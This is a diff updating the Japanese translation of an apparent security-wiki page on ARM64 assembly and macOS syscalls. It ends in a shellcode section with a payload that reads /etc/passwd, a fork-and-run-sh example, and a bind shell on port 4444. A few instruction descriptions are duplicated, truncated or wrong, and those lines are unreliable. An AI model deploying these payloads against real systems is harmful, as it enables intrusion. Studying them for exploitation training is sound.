-- **`blr`**: レジスタへのリンク付きブランチ。ターゲットがレジスタで指定されるサブルーチン呼び出しに使用します。戻りアドレスを `x30` に格納します。
-- 例: `blr x1` — `x1` に格納されたアドレスの関数を呼び出し、戻りアドレスを `x30` に格納します。
-- **`ret`**: サブルーチンからの復帰。通常 `x30` のアドレスを使います。
-- 例: `ret` — `x30` の戻りアドレスを使って現在のサブルーチンから戻ります。
-- **`b.<cond>`**: 条件付きブランチ
-- **`b.eq`**: 等しい場合に分岐（直前の `cmp` に基づく）。
-- 例: `b.eq label` — 直前の `cmp` が等しいと判断した場合に `label` へジャンプします。
-- **`b.ne`**: 等しくない場合に分岐。直前の比較命令で設定された条件フラグをチェックし、等しくなければラベルやアドレスへ分岐します。
-- 例: `cmp x0, x1` の後に `b.ne label` — `x0` と `x1` が等しくない場合 `label` へジャンプします。
-- **`cbz`**: ゼロとの比較とゼロの場合に分岐。レジスタをゼロと比較し、等しい場合に分岐します。
-- 例: `cbz x0, label` — `x0` がゼロなら `label` へジャンプします。
-- **`cbnz`**: 非ゼロの場合に分岐。レジスタをゼロと比較し、等しくなければ分岐します。
-- 例: `cbnz x0, label` — `x0` が非ゼロなら `label` へジャンプします。
-- **`tbnz`**: 指定ビットをテストして非ゼロなら分岐
-- 例: `tbnz x0, #8, label`
-- **`tbz`**: 指定ビットをテストしてゼロなら分岐
-- 例: `tbz x0, #8, label`
-- **条件付きセレクト操作**: 条件ビットに応じて振る舞いが変わる操作群です。
-- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> 真なら X0 = X1、偽なら X0 = X2
-- `csinc Xd, Xn, Xm, cond` -> 真なら Xd = Xn、偽なら Xd = Xm + 1
-- `cinc Xd, Xn, cond` -> 真なら Xd = Xn + 1、偽なら Xd = Xn
-- `csinv Xd, Xn, Xm, cond` -> 真なら Xd = Xn、偽なら Xd = NOT(Xm)
-- `cinv Xd, Xn, cond` -> 真なら Xd = NOT(Xn)、偽なら Xd = Xn
-- `csneg Xd, Xn, Xm, cond` -> 真なら Xd = Xn、偽なら Xd = - Xm
-- `cneg Xd, Xn, cond` -> 真なら Xd = - Xn、偽なら Xd = Xn
-- `cset Xd, Xn, Xm, cond` -> 真なら Xd = 1、偽なら Xd = 0
-- `csetm Xd, Xn, Xm, cond` -> 真なら Xd = \<all 1>、偽なら Xd = 0
-- **`adrp`**: シンボルのページアドレスを計算してレジスタに格納します。
-- 例: `adrp x0, symbol` — `symbol` のページアドレスを計算して `x0` に格納します。
-- **`ldrsw`**: メモリから符号付き 32 ビット値をロードして 64 ビットに符号拡張します。通常 SWITCH ケースで使われます。
-- 例: `ldrsw x0, [x1]` — `x1` が指すメモリ位置から符号付き 32 ビット値を読み、64 ビットに符号拡張して `x0` に格納します。
-- **`stur`**: オフセット付きで別のレジスタからのメモリ位置にレジスタ値をストアします。
-- 例: `stur x0, [x1, #4]` — `x1` に格納されたアドレス +4 の位置に `x0` の値をストアします。
-- **`svc`** : システムコールを行います。Supervisor Call の略です。この命令が実行されると、プロセッサはユーザモードからカーネルモードに切り替わり、カーネルのシステムコール処理コードがある特定のメモリ位置にジャンプします。
+- **Bitfield Extract and Insert**：registerからbitfieldをcopyし、別のregisterへcopyします。
+- **`BFI X1, X2, #3, #4`** X2から4 bitをX1の3rd bitからinsertします。
+- **`BFXIL X1, X2, #3, #4`** X2の3rd bitから4 bitをextractし、X1へcopyします。
+- **`SBFIZ X1, X2, #3, #4`** X2から4 bitをsign-extendし、右側のbitをzeroingしながら、bit position 3からX1へinsertします。
+- **`SBFX X1, X2, #3, #4`** X2からbit 3を始点として4 bitをextractし、sign-extendして結果をX1へ配置します。
+- **`UBFIZ X1, X2, #3, #4`** X2から4 bitをzero-extendし、右側のbitをzeroingしながら、bit position 3からX1へinsertします。
+- **`UBFX X1, X2, #3, #4`** X2からbit 3を始点として4 bitをextractし、zero-extended resultをX1へ配置します。
+- **Sign Extend To X**：値のsign（またはunsigned versionでは単に0）をextendし、その値を使用したoperationを可能にします。
+- **`SXTB X1, W2`** W2からbyteのsignを**W2からX1へ**extendし（`W2`は`X2`の半分）、64 bitを埋めます。
+- **`SXTH X1, W2`** W2から16 bit numberのsignをX1へextendし、64 bitを埋めます。
+- **`SXTW X1, W2`** W2からbyteのsignをX1へextendし、64 bitを埋めます。
+- **`UXTB X1, W2`** W2からbyteへ0（unsigned）を追加してX1へ移し、64 bitを埋めます。
+- **`extr`**：連結された**register pair**からbitをextractします。
+- 例：`EXTR W3, W2, W1, #3`では、**W1+W2**を連結し、W2のbit 3からW1のbit 3までを取得してW3に保存します。
+- **`cmp`**：2つのregisterを**Compare**し、condition flagを設定します。destination registerをzero registerに設定する**`subs`のalias**です。`m == n`を確認する場合に便利です。
+- **`subs`**と同じsyntaxをサポートします。
+- 例：`cmp x0, x1` — `x0`と`x1`の値を比較し、それに応じてcondition flagを設定します。
+- **`cmn`**：**Compare negative** operand。この場合は**`adds`のalias**で、同じsyntaxをサポートします。`m == -n`を確認する場合に便利です。
+- **`ccmp`**：Conditional comparison。前のcomparisonがtrueの場合にのみ実行され、nzcv bitを明示的に設定します。
+- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> x1 != x2かつx3 < x4の場合、funcへjumpします。
+- これは、**前の`cmp`が`NE`の場合にのみ`ccmp`が実行される**ためです。そうでない場合、bit `nzcv`は0に設定されます（`blt` comparisonを満たしません）。
+- これは`ccmn`としても使用できます（`cmp`と`cmn`の関係と同じでnegative）。
+- **`tst`**：comparison対象の値が両方とも1であるかを確認します（結果をどこにも保存しないANDと同様に動作します）。registerと値を比較し、その値で示されたregisterのbitのいずれかが1かを確認する場合に便利です。
+- 例：`tst X1, #7` X1の最後の3 bitのいずれかが1かを確認します。
+- **`teq`**：結果を破棄するXOR operation
+- **`b`**：Unconditional Branch
+- 例：`b myFunction`
+- これはlink registerにreturn addressを設定しません（returnが必要なsubroutine callには適しません）。
+- **`bl`**：link付きの**Branch**。**subroutineをcall**するために使用します。**return addressを`x30`に保存**します。
+- 例：`bl myFunction` — function `myFunction`をcallし、return addressを`x30`に保存します。
+- これはlink registerにreturn addressを設定しません（returnが必要なsubroutine callには適しません）。
+- **`blr`**：RegisterへのLink付きBranch。targetが**registerで指定**されるsubroutineを**call**するために使用します。return addressを`x30`に保存します。（これは
+- 例：`blr x1` — `x1`に含まれるaddressのfunctionをcallし、return addressを`x30`に保存します。
+- **`ret`**：通常、**`x30`**のaddressを使用して**subroutine**から**Return**します。
+- 例：`ret` — `x30`のreturn addressを使用して現在のsubroutineからreturnします。
+- **`b.<cond>`**：Conditional branch
+- **`b.eq`**：直前の`cmp` instructionに基づき、**equalの場合にBranch**します。
+- 例：`b.eq label` — 直前の`cmp` instructionで2つの値が等しい場合、`label`へjumpします。
+- **`b.ne`**：**Not Equalの場合にBranch**します。このinstructionはcondition flag（前のcomparison instructionによって設定）を確認し、比較した値が等しくなければlabelまたはaddressへbranchします。
+- 例：`cmp x0, x1` instructionの後に`b.ne label` — `x0`と`x1`の値が等しくなければ、`label`へjumpします。
+- **`cbz`**：**Compare and Branch on Zero**。registerをzeroと比較し、等しい場合にlabelまたはaddressへbranchします。
+- 例：`cbz x0, label` — `x0`の値がzeroの場合、`label`へjumpします。
+- **`cbnz`**：**Compare and Branch on Non-Zero**。registerをzeroと比較し、等しくない場合にlabelまたはaddressへbranchします。
+- 例：`cbnz x0, label` — `x0`の値がnon-zeroの場合、`label`へjumpします。
+- **`tbnz`**：bitをtestし、nonzeroの場合にbranchします。
+- 例：`tbnz x0, #8, label`
+- **`tbz`**：bitをtestし、zeroの場合にbranchします。
+- 例：`tbz x0, #8, label`
+- **Conditional select operation**：conditional bitに応じて動作が変わるoperationです。
+- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> trueの場合はX0 = X1、falseの場合はX0 = X2
+- `csinc Xd, Xn, Xm, cond` -> trueの場合はXd = Xn、falseの場合はXd = Xm + 1
+- `cinc Xd, Xn, cond` -> trueの場合はXd = Xn + 1、falseの場合はXd = Xn
+- `csinv Xd, Xn, Xm, cond` -> trueの場合はXd = Xn、falseの場合はXd = NOT(Xm)
+- `cinv Xd, Xn, cond` -> trueの場合はXd = NOT(Xn)、falseの場合はXd = Xn
+- `csneg Xd, Xn, Xm, cond` -> trueの場合はXd = Xn、falseの場合はXd = - Xm
+- `cneg Xd, Xn, cond` -> trueの場合はXd = - Xn、falseの場合はXd = Xn
+- `cset Xd, Xn, Xm, cond` -> trueの場合はXd = 1、falseの場合はXd = 0
+- `csetm Xd, Xn, Xm, cond` -> trueの場合はXd = \<all 1>、falseの場合はXd = 0
+- **`adrp`**：**symbolのpage address**を計算し、registerに保存します。
+- 例：`adrp x0, symbol` — `symbol`のpage addressを計算し、`x0`に保存します。
+- **`ldrsw`**：memoryからsigned **32ビット**値を**Load**し、**64** bitへsign-extendします。これは一般的なSWITCH caseに使用されます。
+- 例：`ldrsw x0, [x1]` — `x1`が指すmemory locationからsigned 32-bit valueをloadし、64 bitへsign-extendして`x0`に保存します。
+- **`stur`**：別のregisterからのoffsetを使用して、register valueをmemory locationへ**Store**します。
+- 例：`stur x0, [x1, #4]` — `x0`の値を、現在`x1`にあるaddressより4 byte大きいmemory addressに保存します。
+- **`svc`**：**system call**を実行します。"Supervisor Call"の略です。processorがこのinstructionを実行すると、**user modeからkernel modeへ切り替わり**、**kernelのsystem call handling** codeが配置されたmemory上の特定locationへjumpします。
 
-- 例:
+- 例：
 
 ```armasm
 mov x8, 93  ; Load the system call number for exit (93) into register x8.
@@ -232,40 +233,40 @@ mov x0, 0   ; Load the exit status code (0) into register x0.
 svc 0       ; Make the system call.
 ```
 
-### **関数プロローグ**
+### **Function Prologue**
 
-1. **リンクレジスタとフレームポインタをスタックに保存する**:
+1. **link registerとframe pointerをstackへ保存する**：
 ```armasm
 stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
 ```
-2. **新しいフレームポインタを設定する**: `mov x29, sp` (現在の関数の新しいフレームポインタを設定します)  
-3. **ローカル変数用にスタック上の領域を確保する**（必要な場合）: `sub sp, sp, <size>`（ここで `<size>` は必要なバイト数です）
+2. **新しい frame pointer を設定**: `mov x29, sp`（現在の関数用に新しい frame pointer を設定）
+3. **（必要に応じて）local variables 用の stack 領域を確保**: `sub sp, sp, <size>`（`<size>` は必要なバイト数）
 
-### **関数エピローグ**
+### **Function Epilogue**
 
-1. **ローカル変数を解放する（もし割り当てられていれば）**: `add sp, sp, <size>`  
-2. **リンクレジスタとフレームポインタを復元する**:
+1. **（確保していた場合）local variables 用の領域を解放**: `add sp, sp, <size>`
+2. **link register と frame pointer を復元**:
 ```armasm
 ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
 ```
-3. **Return**: `ret` (リンクレジスタのアドレスを使って呼び出し元に制御を返す)
+3. **Return**: `ret`（link register 内のアドレスを使用して caller に制御を戻す）
 
-## ARM の一般的なメモリ保護
+## ARM Common Memory Protections
 
 {{#ref}}
 ../../../binary-exploitation/ios-exploiting/README.md
 {{#endref}}
 
-## AARCH32 実行状態
+## AARCH32 Execution State
 
-Armv8-A は 32-bit プログラムの実行をサポートします。**AArch32** は **2つの命令セット**：**`A32`** と **`T32`** のいずれかで動作でき、**`interworking`** によって切り替えることができます。\
-**特権** を持つ 64-bit プログラムは、例外レベルを低い 32-bit に移すことで **32-bit の実行** をスケジュールできます。\
-64-bit から 32-bit への遷移は、より低い例外レベルで発生することに注意してください（例えば EL1 の 64-bit プログラムが EL0 のプログラムを起動する場合）。これは、`AArch32` プロセススレッドが実行準備できたときに、特別レジスタ **`SPSR_ELx` のビット4を 1 に設定**し、`SPSR_ELx` の残りが **`AArch32`** プログラムの CPSR を格納することで行われます。その後、特権プロセスは **`ERET`** 命令を呼び出し、プロセッサは CPSR に応じて **`AArch32`** に移行し A32 または T32 に入ります。
+Armv8-A は 32-bit プログラムの実行をサポートします。**AArch32** は **`A32`** と **`T32`** の **2 つの instruction sets** のいずれかで実行でき、**`interworking`** によってこれらを切り替えられます。\
+**Privileged** な 64-bit プログラムは、より低い privilege の 32-bit **exception level** へ transfer を実行することで、**32-bit プログラムの実行**をスケジュールできます。\
+64-bit から 32-bit への transition は、exception level が低下するときに発生することに注意してください（例えば、EL1 の 64-bit プログラムが EL0 のプログラムを起動する場合）。これは、**`AArch32`** process thread の実行準備が整ったときに、**`SPSR_ELx`** special register の **bit 4** を **1** に設定し、`SPSR_ELx` の残りの部分に **`AArch32`** プログラムの CPSR を格納することで行われます。その後、privileged process が **`ERET`** instruction を呼び出すと、processor は **CPSR に応じて** A32 または T32 に入り、**`AArch32`** へ transition します。**
 
-**`interworking`** は CPSR の J ビットと T ビットを使って行われます。 `J=0` かつ `T=0` は **`A32`** を意味し、`J=0` かつ `T=1` は **T32** を意味します。これは基本的に命令セットが T32 であることを示すために **最下位ビットを 1 に設定する**ことに相当します。\
-これは **interworking branch instructions** の間に設定されますが、PC を宛先レジスタに設定する他の命令によって直接設定されることもあります。例：
+**`interworking`** は CPSR の J bit と T bit を使用して行われます。`J=0` かつ `T=0` は **`A32`** を意味し、`J=0` かつ `T=1` は **`T32`** を意味します。これは基本的に、instruction set が T32 であることを示すために **最下位 bit を 1 に設定する**ことを意味します。\
+これは **interworking branch instructions** の実行時に設定されますが、PC が destination register として設定される場合は、他の instructions によって直接設定することもできます。例:
 
-別の例：
+別の例:
 ```armasm
 _start:
 .code 32                ; Begin using A32
@@ -278,60 +279,60 @@ mov r0, #8
 ```
 ### レジスタ
 
-16個の32ビットレジスタ（r0-r15）がある。**r0からr14までは**あらゆる操作に使用できるが、いくつかは通常予約されている：
+16個の32ビットレジスタ（r0-r15）があります。**r0からr14**は**任意の操作**に使用できますが、一部は通常予約されています。
 
-- **`r15`**: プログラムカウンタ（常に）。次の命令のアドレスを保持する。A32では現在のアドレス + 8、T32では現在 + 4。
+- **`r15`**: プログラムカウンタ（常時）。次の命令のアドレスを保持します。A32では current + 8、T32では current + 4です。
 - **`r11`**: フレームポインタ
 - **`r12`**: プロシージャ内呼び出しレジスタ
-- **`r13`**: スタックポインタ（スタックは常に16バイト境界に整列している）
+- **`r13`**: スタックポインタ（スタックは常に16バイト境界にアラインされることに注意してください）
 - **`r14`**: リンクレジスタ
 
-さらに、レジスタは **`banked registries`** にバックアップされている。これらはレジスタ値を格納する場所であり、例外処理や特権操作時に **高速なコンテキスト切り替え** を可能にし、毎回手動でレジスタを保存・復元する必要を回避するためのものだ。\
-これは、例外が取られたプロセッサモードの **`CPSR` から `SPSR` へプロセッサ状態を保存すること** によって行われる。例外復帰時には、**`CPSR`** が **`SPSR`** から復元される。
+さらに、レジスタは**`banked registries`**によってバックアップされます。これはレジスタの値を格納する領域であり、例外処理や特権操作において、毎回レジスタを手動で保存・復元する必要をなくし、**高速なコンテキストスイッチ**を実行できるようにします。\
+これは、プロセッサの状態を**`CPSR`から、例外が移行するプロセッサモードの`SPSR`へ保存**することで行われます。例外から戻る際には、**`CPSR`が`SPSR`から復元**されます。
 
 ### CPSR - Current Program Status Register
 
-AArch32におけるCPSRはAArch64の **`PSTATE`** と同様に機能し、例外時には後で実行を復元するために **`SPSR_ELx`** にも保存される：
+AArch32では、CPSRはAArch64の**`PSTATE`**と同様に機能し、後で実行を復元するため、例外が発生した際には**`SPSR_ELx`**にも保存されます。
 
 <figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>
 
-フィールドは以下のグループに分かれている：
+フィールドはいくつかのグループに分けられます。
 
-- Application Program Status Register (APSR): 算術フラグで、EL0からアクセス可能
-- Execution State Registers: プロセスの挙動（OSが管理）
+- Application Program Status Register (APSR): 算術フラグであり、EL0からアクセス可能
+- Execution State Registers: プロセスの動作（OSによって管理される）
 
 #### Application Program Status Register (APSR)
 
-- **`N`**, **`Z`**, **`C`**, **`V`** フラグ（AArch64と同様）
-- **`Q`** フラグ: 専用の飽和算術命令の実行中に **整数の飽和が発生** すると1にセットされる。一度 **`1`** になると手動で0に設定されるまでその値を保持する。さらに、その値を暗黙的にチェックする命令はなく、明示的に読み取って確認する必要がある。
-- **`GE`**（Greater than or equal）フラグ: SIMD (Single Instruction, Multiple Data) 操作、例えば "parallel add" や "parallel subtract" のような操作で使用される。これらの操作は単一命令で複数のデータポイントを処理できる。
+- **`N`**、**`Z`**、**`C`**、**`V`**フラグ（AArch64と同様）
+- **`Q`**フラグ: 専用の飽和算術命令の実行中に**integer saturationが発生**すると、常に1に設定されます。一度**`1`**に設定されると、手動で0に設定されるまでその値を維持します。また、その値を暗黙的に確認する命令は存在しないため、手動で読み取る必要があります。
+- **`GE`**（Greater than or equal）フラグ: 「parallel add」や「parallel subtract」などのSIMD（Single Instruction, Multiple Data）操作で使用されます。これらの操作により、1つの命令で複数のデータポイントを処理できます。
 
-例えば、**`UADD8`** 命令は（2つの32ビットオペランドから）4つのバイトペアを並列に**加算**し、その結果を32ビットレジスタに格納する。その後、これらの結果に基づいて **`APSR` の `GE` フラグ** を設定する。各GEフラグは各バイト加算に対応しており、そのバイトペアの加算が **オーバーフローしたか** を示す。
+たとえば、**`UADD8`**命令は、2つの32ビットオペランドから**4組のバイトを並列に加算**し、その結果を32ビットレジスタに格納します。その後、これらの結果に基づいて**APSRの`GE`フラグを設定**します。各GEフラグは、4つのバイト加算のうち1つに対応し、そのバイトペアの加算で**overflowが発生したか**を示します。
 
-**`SEL`** 命令はこれらのGEフラグを使って条件付きの動作を行う。
+**`SEL`**命令は、これらのGEフラグを使用して条件付きアクションを実行します。
 
 #### Execution State Registers
 
-- **`J`** および **`T`** ビット: **`J`** は0であるべきで、**`T`** が0なら命令セットは A32、1なら T32 が使用される。
-- **IT Block State Register** (`ITSTATE`): ビット10–15および25–26で、**`IT`** プレフィックスのグループ内の命令に対する条件を格納する。
-- **`E`** ビット: エンディアンネスを示す。
-- **Mode and Exception Mask Bits** (0-4): 現在の実行状態を決定する。5番目のビットはプログラムが32bit（1）で動作しているか64bit（0）で動作しているかを示す。他の4ビットは **現在使用されている例外モード**（例外が発生して処理されているとき）を表す。設定された数値は、処理中に別の例外が発生した場合の **現在の優先度** を示す。
+- **`J`**ビットと**`T`**ビット: **`J`**は0である必要があります。**`T`**が0の場合は命令セットA32が使用され、1の場合はT32が使用されます。
+- **IT Block State Register**（`ITSTATE`）: 10-15ビットおよび25-26ビットです。**`IT`**を前置したグループ内の命令に対する条件を格納します。
+- **`E`**ビット: エンディアンを示します。
+- **Mode and Exception Mask Bits**（0-4）: 現在の実行状態を決定します。5番目のビットは、プログラムが32ビット（1）または64ビット（0）として実行されているかを示します。残りの4ビットは、現在使用されている**exception mode**（例外が発生して処理中の場合）を表します。設定された値は、この例外の処理中に別の例外が発生した場合の**現在の優先度**を示します。
 
 <figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>
 
-- **`AIF`**: 特定の例外は **`A`**, `I`, `F` ビットで無効化できる。**`A`** が1の場合は **asynchronous aborts** がトリガーされる。**`I`** は外部ハードウェアの Interrupt Requests（IRQs）に応答する設定を行い、`F` は Fast Interrupt Requests（FIRs）に関連する。
+- **`AIF`**: 特定の例外は、**`A`**、`I`、`F`ビットを使用して無効化できます。**`A`**が1の場合、**asynchronous aborts**がトリガーされることを意味します。**`I`**は、外部ハードウェアの**Interrupts Requests**（IRQ）への応答を設定します。また、Fは**Fast Interrupt Requests**（FIR）に関連します。
 
 ## macOS
 
 ### BSD syscalls
 
-Check out [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) or run `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls will have **x16 > 0**.
+[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)を確認するか、`cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`を実行してください。BSD syscallsでは**x16 > 0**になります。
 
 ### Mach Traps
 
-Check out in [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) the `mach_trap_table` and in [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) the prototypes. The max number of Mach traps is `MACH_TRAP_TABLE_COUNT` = 128. Mach traps will have **x16 < 0**, so you need to call the numbers from the previous list with a **minus**: **`_kernelrpc_mach_vm_allocate_trap`** is **`-10`**.
+[**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html)で`mach_trap_table`を、[**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h)でプロトタイプを確認してください。Mach trapsの最大数は`MACH_TRAP_TABLE_COUNT` = 128です。Mach trapsでは**x16 < 0**になるため、前のリストの番号を**マイナス**にして呼び出す必要があります。**`_kernelrpc_mach_vm_allocate_trap`**は**`-10`**です。
 
-You can also check **`libsystem_kernel.dylib`** in a disassembler to find how to call these (and BSD) syscalls:
+これら（およびBSD）のsyscallsをどのように呼び出すかを確認するには、disassemblerで**`libsystem_kernel.dylib`**を調べることもできます。
 ```bash
 # macOS
 dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e
@@ -342,29 +343,29 @@ dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shar
 Note that **Ida** and **Ghidra** can also decompile **specific dylibs** from the cache just by passing the cache.
 
 > [!TIP]
-> 場合によっては、ソースコードを確認するよりも **`libsystem_kernel.dylib`** の**逆コンパイルされた**コードを確認したほうが簡単なことがあります。複数の syscall (BSD や Mach) のコードはスクリプトで生成されるため（ソースコードのコメントを確認してください）、dylib 内では何が呼ばれているかを直接見つけられるからです。
+> **source code**を確認する**よりも**、**`libsystem_kernel.dylib`**の**decompiled** codeを確認した方が簡単な場合があります。これは、複数のsyscall（BSDおよびMach）のcodeがscripts経由で生成されるためです（source code内のcommentsを確認してください）。一方、dylibでは何が呼び出されているかを確認できます。
 
 ### machdep calls
 
-XNU は machine dependent（machdep）と呼ばれる別種の呼び出しをサポートしています。これらの呼び出しの番号はアーキテクチャに依存しており、呼び出し自体も番号も恒久的に一定である保証はありません。
+XNUは、machine dependentと呼ばれる別のタイプのcallsもサポートしています。これらのcallsのnumbersはarchitectureによって異なり、callsもnumbersも一定であり続ける保証はありません。
 
 ### comm page
 
-これはカーネル所有のメモリページで、すべてのユーザープロセスのアドレス空間にマップされます。非常に頻繁に使用され、その都度 syscalls を使うと遷移が非常に非効率になるようなカーネルサービスに対して、ユーザーモードからカーネル空間への遷移を高速化するためのものです。
+これはkernelが所有するmemory pageで、すべてのusers processのaddress spaceにmapされています。kernel servicesで非常に頻繁に使用されるものについて、user modeからkernel spaceへのtransitionが非常に非効率になるため、syscallsを使用するよりもこのtransitionを高速化することを目的としています。
 
-For example the call `gettimeofdate` reads the value of `timeval` directly from the comm page.
+例えば、`gettimeofdate` callは`timeval`のvalueをcomm pageから直接読み取ります。
 
 ### objc_msgSend
 
-Objective-C や Swift のプログラムでこの関数が使われているのを見かけることは非常に多いです。この関数は Objective-C オブジェクトのメソッドを呼び出すためのものです。
+Objective-CまたはSwift programsでこのfunctionが使用されているのを非常によく見かけます。このfunctionを使うと、Objective-C objectのmethodを呼び出せます。
 
 Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):
 
-- x0: self -> インスタンスへのポインタ
-- x1: op -> メソッドのセレクタ
-- x2... -> 呼び出されるメソッドの残りの引数
+- x0: self -> instanceへのPointer
+- x1: op -> methodのSelector
+- x2... -> invoked methodの残りのarguments
 
-したがって、この関数へ分岐する前にブレークポイントを置けば、lldb で何が呼ばれているかを簡単に見つけられます（この例ではオブジェクトは `NSConcreteTask` のオブジェクトを呼び出し、コマンドを実行します）：
+したがって、このfunctionへのbranchの前にbreakpointを設定すると、以下のようにlldbで何がinvokedされるかを簡単に確認できます（この例では、objectが`NSConcreteTask`のobjectを呼び出し、そのobjectがcommandを実行します）。
 ```bash
 # Right in the line were objc_msgSend will be called
 (lldb) po $x0
@@ -383,31 +384,31 @@ whoami
 )
 ```
 > [!TIP]
-> 環境変数 **`NSObjCMessageLoggingEnabled=1`** を設定すると、この関数が呼ばれたときに `/tmp/msgSends-pid` のようなファイルにログを出力できます。
+> 環境変数 **`NSObjCMessageLoggingEnabled=1`** を設定すると、この関数が呼び出されたときに `/tmp/msgSends-pid` のようなファイルへ log を記録できます。
 >
-> さらに、**`OBJC_HELP=1`** を設定して任意のバイナリを実行すると、特定の Objc-C アクションが発生したときに **log** するために使える他の環境変数を確認できます。
+> さらに、**`OBJC_HELP=1`** を設定して任意の binary を呼び出すと、特定の Objc-C の action が発生したときに **log** を記録するために使用できる、その他の環境変数を確認できます。
 
-この関数が呼び出されると、対象インスタンスの呼ばれたメソッドを見つける必要があり、そのためにいくつかの異なる検索が行われます:
+この関数が呼び出されると、指定された instance の呼び出し先 method を見つける必要があり、そのために以下の検索が行われます。
 
-- Perform optimistic cache lookup:
-- If successful, done
-- Acquire runtimeLock (read)
-- If (realize && !cls->realized) の場合、クラスを realize する
-- If (initialize && !cls->initialized) の場合、クラスを initialize する
-- Try class own cache:
-- If successful, done
-- Try class method list:
-- If found, fill cache and done
-- Try superclass cache:
-- If successful, done
-- Try superclass method list:
-- If found, fill cache and done
-- If (resolver) の場合、method resolver を試し、class lookup からやり直す
-- If still here (= all else has failed) の場合は forwarder を試す
+- Optimistic cache lookup を実行:
+- 成功した場合は終了
+- runtimeLock を acquire（read）
+- （realize && !cls->realized）の場合、class を realize
+- （initialize && !cls->initialized）の場合、class を initialize
+- class 自身の cache を試行:
+- 成功した場合は終了
+- class の method list を試行:
+- 見つかった場合、cache に格納して終了
+- superclass の cache を試行:
+- 成功した場合は終了
+- superclass の method list を試行:
+- 見つかった場合、cache に格納して終了
+- （resolver）の場合、method resolver を試行し、class lookup から再実行
+- ここまで到達した場合（その他すべてが失敗した場合）、forwarder を試行
 
 ### Shellcodes
 
-コンパイルするには:
+Compile するには:
 ```bash
 as -o shell.o shell.s
 ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
@@ -415,14 +416,14 @@ ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/Comm
 # You could also use this
 ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
 ```
-バイトを抽出するには：
+バイト列を抽出するには：
 ```bash
 # Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
 for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
 echo -n '\\x'$c
 done
 ```
-より新しい macOS の場合:
+新しいmacOSの場合：
 ```bash
 # Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
 for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
@@ -431,7 +432,7 @@ done
 ```
 <details>
 
-<summary>shellcodeをテストするためのCコード</summary>
+<summary>shellcodeをテストするCコード</summary>
 ```c
 // code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
 // gcc loader.c -o loader
@@ -481,7 +482,7 @@ return 0;
 
 #### Shell
 
-は[**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)から取られ、解説します。
+[**こちら**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)から引用し、解説しています。<sup>[1]</sup>
 
 {{#tabs}}
 {{#tab name="with adr"}}
@@ -553,7 +554,7 @@ sh_path: .asciz "/bin/sh"
 
 #### catで読み取る
 
-目的は `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` を実行することで、したがって第2引数 (x1) は params の配列で（メモリ上ではこれは addresses の stack を意味する）。
+目的は`execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`を実行することです。そのため、2番目の引数（x1）はパラメータの配列です（メモリ上では、アドレスがスタックに積まれたものを意味します）。
 ```armasm
 .section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
 .global _main              ; Declare a global symbol _main
@@ -579,7 +580,7 @@ cat_path: .asciz "/bin/cat"
 .align 2
 passwd_path: .asciz "/etc/passwd"
 ```
-#### fork から sh でコマンドを実行してメインプロセスが終了しないようにする
+#### fork から sh でコマンドを呼び出し、main process が kill されないようにする
 ```armasm
 .section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
 .global _main              ; Declare a global symbol _main
@@ -625,7 +626,7 @@ touch_command: .asciz "touch /tmp/lalala"
 ```
 #### Bind shell
 
-Bind shell は [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)（**port 4444**）
+[https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) の **port 4444** における Bind shell<sup>[2]</sup>
 ```armasm
 .section __TEXT,__text
 .global _main
@@ -709,7 +710,7 @@ svc  #0x1337
 ```
 #### Reverse shell
 
